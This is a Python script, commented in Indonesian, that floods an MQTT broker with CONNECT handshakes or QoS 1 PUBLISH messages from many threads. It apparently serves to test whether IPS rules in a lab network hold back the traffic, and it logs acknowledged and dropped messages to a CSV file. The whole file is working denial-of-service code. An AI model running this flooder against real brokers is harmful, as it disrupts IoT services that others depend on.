#!/usr/bin/env python3
"""Penyerang: banjiri broker MQTT dengan CONNECT atau PUBLISH.

mode connect : flood pada tahap KONEKSI. Tiap percobaan membuka koneksi TCP
    baru + handshake CONNECT/CONNACK, lalu tutup. (Perilaku sama seperti
    versi sebelumnya -- dipakai untuk menguji rule mqtt.type:CONNECT.)

mode publish : flood pada tahap PESAN. Tiap worker membuka SATU koneksi
    (satu client_id tetap) dan mempertahankannya, lalu mengirim banyak
    PUBLISH QoS 1 beruntun lewat koneksi yang SAMA. Broker WAJIB membalas
    PUBACK untuk tiap pesan; kalau tidak ada balasan dalam batas waktu
    (--timeout), pesan itu dihitung "dropped" -- inilah yang membuktikan
    rule mqtt.type:PUBLISH benar-benar menahan pesan, bukan sekadar
    memutuskan koneksi. Kalau koneksi sampai putus, worker membuka koneksi
    baru dan melanjutkan (dicatat di 'conn_resets').

Contoh:
  python3 attack_flood.py --mode connect --rate 1000 --workers 200 --duration 60
  python3 attack_flood.py --mode publish --rate 0 --workers 20 --duration 60
  (publish: --rate adalah target pesan/detik PER WORKER; 0 = secepat mungkin)
"""
import argparse
import csv
import socket
import struct
import threading
import time

from mqtt_raw import publish_pkt, read_packet, tcp_connect, mqtt_handshake, MQTTError

ap = argparse.ArgumentParser()
ap.add_argument("--broker", default="192.168.20.10")
ap.add_argument("--port", type=int, default=1883)
ap.add_argument("--src", default="192.168.10.10", help="IP sumber penyerang")
ap.add_argument("--mode", choices=["connect", "publish"], default="connect")
ap.add_argument("--rate", type=float, default=2000,
                 help="connect: target TOTAL percobaan/detik (0=secepat mungkin). "
                      "publish: target pesan/detik PER WORKER (0=secepat mungkin)")
ap.add_argument("--duration", type=int, default=60)
ap.add_argument("--workers", type=int, default=50)
ap.add_argument("--timeout", type=float, default=1.0, help="batas tunggu CONNACK/PUBACK (detik)")
ap.add_argument("--payload-size", type=int, default=128)
ap.add_argument("--out", default="attack.csv")
args = ap.parse_args()

start = time.time()
stop_at = start + args.duration
counter = {"sent": 0, "ok": 0, "dropped": 0, "connects": 0, "conn_resets": 0}
lock = threading.Lock()


def add(key, n=1):
    with lock:
        counter[key] += n


def close(s):
    try:
        s.close()
    except OSError:
        pass


def worker_connect(wid):
    """Flood tahap KONEKSI: buka koneksi baru tiap percobaan (perilaku lama)."""
    delay = args.workers / args.rate if args.rate > 0 else 0
    n = 0
    while time.time() < stop_at:
        n += 1
        ok = False
        try:
            s = tcp_connect(args.broker, args.port, args.src, args.timeout)
            mqtt_handshake(s, f"atkc{wid}-{n}")
            ok = True
            close(s)
        except (OSError, MQTTError, ConnectionError):
            ok = False
        add("sent")
        add("ok" if ok else "dropped")
        if delay:
            time.sleep(delay)


def worker_publish(wid):
    """Flood tahap PESAN: satu koneksi bertahan, banyak PUBLISH QoS1 beruntun."""
    delay = 1.0 / args.rate if args.rate > 0 else 0
    payload = b"x" * args.payload_size
    s, pid = None, 0
    while time.time() < stop_at:
        if s is None:
            try:
                s = tcp_connect(args.broker, args.port, args.src, args.timeout)
                mqtt_handshake(s, f"atkp{wid}")
                add("connects")
            except (OSError, MQTTError, ConnectionError):
                s = None
                time.sleep(0.05)  # jangan spin cepat kalau connect terus ditolak
                continue
        pid = pid % 65535 + 1
        status = "ok"
        try:
            s.sendall(publish_pkt(f"flood/{wid}", payload, qos=1, pid=pid))
            while True:
                header, body = read_packet(s)
                if header >> 4 == 4 and struct.unpack("!H", body[:2])[0] == pid:
                    break
        except socket.timeout:
            status = "dropped"  # tidak ada PUBACK -> ditahan IPS / broker sibuk
        except (OSError, ConnectionError):
            status = "dropped"
        add("sent")
        add("ok" if status == "ok" else "dropped")
        if status != "ok":
            close(s)
            s = None
            add("conn_resets")
            continue
        if delay:
            time.sleep(delay)
    if s:
        close(s)


target = worker_connect if args.mode == "connect" else worker_publish
threads = [threading.Thread(target=target, args=(i,), daemon=True) for i in range(args.workers)]
for t in threads:
    t.start()
for t in threads:
    t.join()

dur = time.time() - start
sent, ok, dropped = counter["sent"], counter["ok"], counter["dropped"]
with open(args.out, "w", newline="") as f:
    w = csv.writer(f)
    w.writerow(["mode", "durasi_s", "percobaan", "berhasil", "gagal_drop",
                "laju_aktual_per_s", "connects", "conn_resets"])
    w.writerow([args.mode, f"{dur:.2f}", sent, ok, dropped,
                f"{sent / dur:.1f}" if dur else 0, counter["connects"], counter["conn_resets"]])

print("=" * 50)
print(f"RINGKASAN PENYERANG ({args.mode.upper()} FLOOD)")
print("=" * 50)
print(f"Durasi                     : {dur:.2f} s")
if args.mode == "connect":
    print(f"Percobaan koneksi terkirim : {sent}")
else:
    print(f"Koneksi dibuka             : {counter['connects']} (idealnya ~jumlah worker: {args.workers})")
    print(f"Koneksi diputus paksa      : {counter['conn_resets']}  <- makin tinggi = makin sering ditahan IPS")
    print(f"Pesan PUBLISH dicoba       : {sent}")
print(f"Laju aktual                : {sent / dur:.1f} /s" if dur else "-")
print(f"Berhasil dikonfirmasi      : {ok} ({ok / sent * 100:.1f} %)" if sent else "-")
print(f"Ditahan / gagal            : {dropped} ({dropped / sent * 100:.1f} %)" if sent else "-")
